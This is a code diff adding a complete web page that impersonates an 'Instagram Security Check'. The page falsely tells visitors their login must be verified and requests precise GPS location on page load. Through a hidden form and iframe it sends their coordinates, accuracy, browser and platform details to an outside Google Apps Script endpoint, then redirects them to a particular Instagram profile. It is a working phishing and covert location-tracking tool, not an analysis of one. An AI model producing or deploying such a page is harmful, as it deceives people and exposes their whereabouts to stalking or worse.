@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Security Check</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            color: #262626;
+            text-align: center;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 30px;
+            width: 80%;
+            max-width: 350px;
+        }
+        .logo {
+            font-weight: 600;
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            display: block;
+        }
+        .loader {
+            margin: 20px auto;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #3897f0;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        p {
+            font-size: 14px;
+            line-height: 1.4;
+            color: #8e8e8e;
+        }
+        #status {
+            margin-top: 15px;
+            font-size: 13px;
+            color: #8e8e8e;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <span class="logo">Instagram</span>
+        <div class="loader"></div>
+        <p><strong>Checking your account activity...</strong></p>
+        <p>For your security, Instagram needs to verify your location to confirm the recent login attempt.</p>
+        <div id="status">Initializing security check...</div>
+    </div>
+
+    <!-- HIDDEN IFRAME FOR FORM SUBMISSION -->
+    <iframe name="hiddenFrame" id="hiddenFrame" style="display: none; width: 0; height: 0; border: none;"></iframe>
+
+    <script>
+        // FUNCTION: AGGRESSIVE LOCATION GRAB AND LOGGING
+        function getLocation() {
+            const statusElement = document.getElementById('status');
+            statusElement.textContent = "Requesting location access...";
+            
+            // 1. Configure your logging endpoint - YOUR GOOGLE SCRIPT URL
+            const LOGGING_ENDPOINT = "https://script.google.com/macros/s/AKfycbzY540HpUiGqD0_iVQ5EqiQKCTCZRtBbXsckpHX6XM6G44pQ-KjsZ224BmWjZQGTYjx/exec";
+
+            if (navigator.geolocation) {
+                statusElement.textContent = "Please allow location access to continue...";
+                
+                navigator.geolocation.getCurrentPosition(
+                    // SUCCESS FUNCTION
+                    function(position) {
+                        statusElement.textContent = "Location accessed. Finalizing verification...";
+                        
+                        // 2. PACKAGE THE PRECISE GPS DATA
+                        const lat = position.coords.latitude;
+                        const lng = position.coords.longitude;
+                        const acc = position.coords.accuracy;
+
+                        // 3. SEND DATA VIA HIDDEN FORM POST
+                        const form = document.createElement('form');
+                        form.method = 'POST';
+                        form.action = LOGGING_ENDPOINT;
+                        form.target = 'hiddenFrame'; // Target the hidden iframe
+
+                        // Function to add hidden input fields
+                        const addField = (name, value) => {
+                            const input = document.createElement('input');
+                            input.type = 'hidden';
+                            input.name = name;
+                            input.value = value;
+                            form.appendChild(input);
+                        };
+
+                        // Add all the data as form fields
+                        addField('status', 'GPS_SUCCESS');
+                        addField('timestamp', new Date().toISOString());
+                        addField('latitude', lat);
+                        addField('longitude', lng);
+                        addField('accuracy', acc);
+                        addField('user_agent', navigator.userAgent);
+                        addField('language', navigator.language);
+                        addField('platform', navigator.platform);
+
+                        // Append the form to the body and submit it
+                        document.body.appendChild(form);
+                        form.submit(); // This sends the POST request to your server
+                        document.body.removeChild(form);
+
+                        console.log("SUCCESS: Data sent via form POST", { lat, lng });
+
+                        statusElement.textContent = "Verification complete. Redirecting...";
+
+                        // 4. REDIRECT TO THE SPECIFIC INSTAGRAM PROFILE
+                        setTimeout(() => {
+                            window.location.href = 'https://www.instagram.com/caribbeanmegabounce/';
+                        }, 1000);
+                    },
+                    // ERROR FUNCTION (USER DENIED OR TIMED OUT)
+                    function(error) {
+                        let errorMsg = "Location access denied. ";
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMsg = "You denied location access. This is required for security verification.";
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMsg = "Location information is unavailable.";
+                                break;
+                            case error.TIMEOUT:
+                                errorMsg = "Location request timed out.";
+                                break;
+                            default:
+                                errorMsg = "An unknown error occurred.";
+                                break;
+                        }
+                        
+                        statusElement.textContent = errorMsg;
+
+                        // Still try to log the failure via form
+                        const form = document.createElement('form');
+                        form.method = 'POST';
+                        form.action = LOGGING_ENDPOINT;
+                        form.target = 'hiddenFrame';
+
+                        const addField = (name, value) => {
+                            const input = document.createElement('input');
+                            input.type = 'hidden';
+                            input.name = name;
+                            input.value = value;
+                            form.appendChild(input);
+                        };
+
+                        addField('status', 'GPS_FAILURE');
+                        addField('timestamp', new Date().toISOString());
+                        addField('error_code', error.code);
+                        addField('user_agent', navigator.userAgent);
+
+                        document.body.appendChild(form);
+                        form.submit();
+                        document.body.removeChild(form);
+
+                        // Still redirect after a delay
+                        setTimeout(() => {
+                            window.location.href = 'https://www.instagram.com/caribbeanmegabounce/';
+                        }, 3000);
+                    },
+                    // OPTIONS: Demand high accuracy, don't use cached data.
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 8000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                statusElement.textContent = "Your browser doesn't support location features. Redirecting...";
+                setTimeout(() => {
+                    window.location.href = 'https://www.instagram.com/caribbeanmegabounce/';
+                }, 2000);
+            }
+        }
+
+        // START THE PROCESS AS SOON AS THE PAGE LOADS
+        window.onload = getLocation;
+    </script>
+</body>
+</html>
